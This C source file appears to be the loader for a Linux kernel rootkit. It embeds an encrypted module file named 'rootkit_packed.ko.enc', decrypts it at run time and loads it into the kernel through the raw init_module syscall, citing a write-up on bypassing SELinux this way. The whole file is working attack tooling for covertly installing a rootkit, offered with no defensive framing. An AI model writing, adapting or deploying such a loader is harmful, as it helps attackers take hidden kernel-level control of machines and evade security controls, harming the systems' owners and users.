// https://github.com/cirosantilli/linux-kernel-module-cheat/blob/91583552ba2c2d547c8577ac888ab9f851642b25/kernel_module/user/myinsmod.c

// https://seanpesce.blogspot.com/2023/05/bypassing-selinux-with-initmodule.html 

#define _GNU_SOURCE
#include <errno.h>
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/stat.h>
#include <sys/syscall.h>
#include <sys/types.h>
#include <unistd.h>
#include <string.h>

#include "../encrypt/encrypt.h"

static char enc_rootkit[] = {
#include "rootkit_packed.ko.enc"
};

#define init_module(mod, len, opts) syscall(__NR_init_module, mod, len, opts)

int main(void)
{
	int ret = EXIT_FAILURE;
	size_t len;
	void *module_image;

	len = sizeof(enc_rootkit);
	printf("%d\n", len);
	do_decrypt(enc_rootkit, len, DECRYPTION_KEY);
	module_image = malloc(len);
    if (module_image == NULL)
    {
		printf("malloc err\n");
        goto out;
    }
	memcpy(module_image, enc_rootkit, len);
    
	
	if(init_module(module_image, len, "")!=0)
	{
		perror("init_module");
	}

	free(module_image);
    out:
	    return ret;
}
